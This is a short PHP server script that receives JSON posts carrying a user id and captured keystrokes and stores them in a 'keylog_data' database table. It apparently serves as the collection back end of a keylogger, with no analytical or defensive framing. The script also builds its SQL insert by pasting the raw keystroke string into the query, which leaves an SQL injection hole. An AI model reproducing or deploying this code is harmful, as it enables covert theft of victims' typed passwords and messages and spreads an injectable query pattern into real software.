<?php
include "../db.php";
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $json = file_get_contents('php://input');
    
    $data = json_decode($json, true);
    
    if (isset($data['uid']) && isset($data['keys'])) {
        // Récupère le client_id
 
        $uid = (int)$data['uid'];
        $keys = $data['keys'];
        
        $sql = "INSERT INTO keylog_data(uid, key_stroke) VALUES (" . $uid . ",'" . $keys . "')";
        mysqli_query($conn, $sql);  

        header('HTTP/1.1 200 OK');
        echo json_encode(['status' => 'success', 'uid' => $uid]);
    } else {

        header('HTTP/1.1 400 Bad Request');
        echo json_encode(['status' => 'error', 'message' => 'uid / keys missing']);
    }
} else {

    header('HTTP/1.1 405 Method Not Allowed');
    echo json_encode(['status' => 'error', 'message' => 'Method not allowed']);
}
?>
